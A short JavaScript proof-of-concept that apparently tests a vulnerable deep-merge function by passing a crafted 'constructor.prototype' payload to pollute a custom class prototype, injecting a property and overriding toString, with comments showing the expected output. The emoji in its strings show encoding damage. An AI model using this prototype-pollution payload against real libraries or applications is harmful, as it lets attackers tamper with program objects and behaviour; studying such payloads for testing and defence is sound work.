
const objectMergeDeep = require('./INPROGRESSvulnerable_slice');

// A custom base object we want to pollute
function Victim() {}
Victim.prototype.toString = function () {
  return "[Victim]";
};

const instanceBefore = new Victim();
console.log("Before pollution:", instanceBefore.polluted); // undefined

// Payload to pollute Victim.prototype
const payload = {
  constructor: {
    prototype: {
      polluted: "ğŸ’€ Injected",
      toString: () => "â˜ ï¸ Compromised"
    }
  }
};

// Trigger the pollution â€” now targeting Victim instead of Object
objectMergeDeep(Victim.prototype, payload);

// Check result
const instanceAfter = new Victim();
console.log("After pollution - polluted:", instanceAfter.polluted); // ğŸ’€ Injected
console.log("After pollution - toString():", instanceAfter.toString()); // â˜ ï¸ Compromised

